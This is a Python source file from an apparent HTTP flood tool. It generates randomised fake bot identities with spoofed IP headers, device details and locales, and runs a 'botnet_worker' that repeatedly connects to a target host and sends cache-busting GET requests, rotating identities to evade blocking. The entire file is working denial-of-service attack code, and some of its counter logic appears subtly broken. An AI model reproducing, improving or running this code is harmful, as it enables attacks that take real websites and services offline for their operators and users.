import random
from core.headers import HEADERS_DATA

COUNTRIES = [
    {"country": "US", "city": "New York", "timezone": "America/New_York", "lang": "en-US"},
    {"country": "GB", "city": "London", "timezone": "Europe/London", "lang": "en-GB"},
    {"country": "DE", "city": "Berlin", "timezone": "Europe/Berlin", "lang": "de-DE"},
    {"country": "FR", "city": "Paris", "timezone": "Europe/Paris", "lang": "fr-FR"},
    {"country": "JP", "city": "Tokyo", "timezone": "Asia/Tokyo", "lang": "ja-JP"},
    {"country": "BR", "city": "São Paulo", "timezone": "America/Sao_Paulo", "lang": "pt-BR"},
    {"country": "SA", "city": "Riyadh", "timezone": "Asia/Riyadh", "lang": "ar-SA"},
    {"country": "AE", "city": "Dubai", "timezone": "Asia/Dubai", "lang": "ar-AE"},
    {"country": "IN", "city": "Mumbai", "timezone": "Asia/Kolkata", "lang": "hi-IN"},
    {"country": "RU", "city": "Moscow", "timezone": "Europe/Moscow", "lang": "ru-RU"},
    {"country": "CA", "city": "Toronto", "timezone": "America/Toronto", "lang": "en-CA"},
    {"country": "AU", "city": "Sydney", "timezone": "Australia/Sydney", "lang": "en-AU"},
    {"country": "KR", "city": "Seoul", "timezone": "Asia/Seoul", "lang": "ko-KR"},
    {"country": "IT", "city": "Rome", "timezone": "Europe/Rome", "lang": "it-IT"},
    {"country": "ES", "city": "Madrid", "timezone": "Europe/Madrid", "lang": "es-ES"},
    {"country": "TR", "city": "Istanbul", "timezone": "Europe/Istanbul", "lang": "tr-TR"},
    {"country": "MX", "city": "Mexico City", "timezone": "America/Mexico_City", "lang": "es-MX"},
    {"country": "SG", "city": "Singapore", "timezone": "Asia/Singapore", "lang": "zh-SG"},
    {"country": "ZA", "city": "Johannesburg", "timezone": "Africa/Johannesburg", "lang": "en-ZA"},
    {"country": "AR", "city": "Buenos Aires", "timezone": "America/Argentina/Buenos_Aires", "lang": "es-AR"},
]

DEVICES = [
    {"model": "SM-G998B", "brand": "Samsung", "os": "Android 14", "w": 1440, "h": 3088},
    {"model": "iPhone 15 Pro Max", "brand": "Apple", "os": "iOS 17.4", "w": 1290, "h": 2796},
    {"model": "Pixel 8 Pro", "brand": "Google", "os": "Android 14", "w": 1344, "h": 2992},
    {"model": "OnePlus 12", "brand": "OnePlus", "os": "Android 14", "w": 1440, "h": 3168},
    {"model": "Xiaomi 14 Pro", "brand": "Xiaomi", "os": "Android 14", "w": 1440, "h": 3200},
]

UAGENTS_MOBILE = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
]

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_bot_identity():
    country = random.choice(COUNTRIES)
    device = random.choice(DEVICES)
    is_mobile = random.random() > 0.5
    ua = random.choice(UAGENTS_MOBILE if is_mobile else [])
    if not ua:
        from core.headers import UAGENTS_DESKTOP
        ua = random.choice(UAGENTS_DESKTOP)
    ip = random_ip()
    return {
        "ip": ip, "country": country["country"], "city": country["city"],
        "lang": country["lang"], "device": device["model"], "brand": device["brand"],
        "os": device["os"], "screen": f"{device['w']}x{device['h']}",
        "ua": ua, "is_mobile": is_mobile
    }

def botnet_worker(host, port, lock):
    import socket
    from core.attacks import sent as s, failed as f
    
    bot = get_bot_identity()
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((host, port))
            packet = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\n"
            packet += f"User-Agent: {bot['ua']}\r\n"
            packet += f"Accept-Language: {bot['lang']},{bot['lang'].split('-')[0]};q=0.9\r\n"
            packet += HEADERS_DATA
            packet += f"X-Forwarded-For: {bot['ip']}\r\n"
            packet += f"X-Real-IP: {bot['ip']}\r\n"
            packet += f"X-Device-Model: {bot['device']}\r\n"
            packet += f"X-Device-Brand: {bot['brand']}\r\n"
            packet += f"X-Device-OS: {bot['os']}\r\n"
            packet += f"X-Device-Screen: {bot['screen']}\r\n"
            packet += f"X-Country: {bot['country']}\r\n"
            packet += f"X-City: {bot['city']}\r\n"
            if bot['is_mobile']:
                packet += "Sec-Ch-Ua-Mobile: ?1\r\n"
            packet += "\r\n"
            sock.send(packet.encode())
            with lock:
                from core.attacks import sent, failed
                sent += 1
            sock.close()
            if sent % 50 == 0: bot = get_bot_identity()
        except:
            with lock:
                from core.attacks import failed
                failed += 1
            try: sock.close()
            except: pass
